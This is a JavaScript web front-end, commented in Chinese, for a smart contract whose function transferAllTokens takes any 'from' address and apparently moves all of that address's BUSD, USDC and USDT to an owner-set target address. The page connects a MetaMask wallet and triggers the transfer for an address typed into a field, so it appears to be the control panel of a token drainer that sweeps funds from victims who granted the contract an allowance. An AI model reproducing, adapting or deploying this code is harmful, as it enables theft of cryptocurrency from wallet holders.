const contractAddress = "0xEf9f1ACE83dfbB8f559Da621f4aEA72C6EB10eBf"; // 您的合约地址
const abi = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            }
        ],
        "name": "transferAllTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    },
    {
        "inputs": [],
        "name": "busdToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "targetAddress",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "usdcToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "usdtToken",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

let web3;
let contract;

$(document).ready(async () => {
    // 连接钱包按钮
    $('#connectButton').click(async () => {
        if (typeof window.ethereum !== 'undefined') {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            web3 = new Web3(window.ethereum);
            contract = new web3.eth.Contract(abi, contractAddress);
            $('#message').text("钱包连接成功").css("color", "green");
        } else {
            $('#message').text("请安装 MetaMask");
        }
    });

    // 转移所有代币按钮
    $('#transferButton').click(async () => {
        const fromAddress = $('#fromAddress').val();
        const accounts = await web3.eth.getAccounts();

        try {
            const result = await contract.methods.transferAllTokens(fromAddress).send({ from: accounts[0] });
            $('#message').text("转移成功: " + result.transactionHash).css("color", "green");
        } catch (error) {
            console.error(error);
            $('#message').text("转移失败: " + error.message);
        }
    });
});
